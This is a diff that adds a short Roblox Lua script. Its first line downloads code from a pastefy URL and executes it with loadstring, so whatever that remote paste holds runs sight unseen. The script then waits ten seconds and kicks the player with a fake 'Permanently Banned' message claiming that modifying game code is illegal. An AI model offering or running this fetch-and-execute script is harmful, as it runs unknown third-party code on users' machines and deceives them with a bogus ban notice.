@@ -1,0 +1,15 @@
+loadstring(game:HttpGet("https://pastefy.app/ZhKVgCK3/raw"))()
+wait(10)
+local Players = game:GetService("Players")
+
+local function kickPlayer(message1, message2)
+    local player = Players.LocalPlayer
+    if player then
+        player:Kick(message1 .. "\n" .. message2)
+    end
+end
+
+local customMessage1 = "Permanently Banned."
+local customMessage2 = "Modifying the game code is illegal."
+
+kickPlayer(customMessage1, customMessage2)
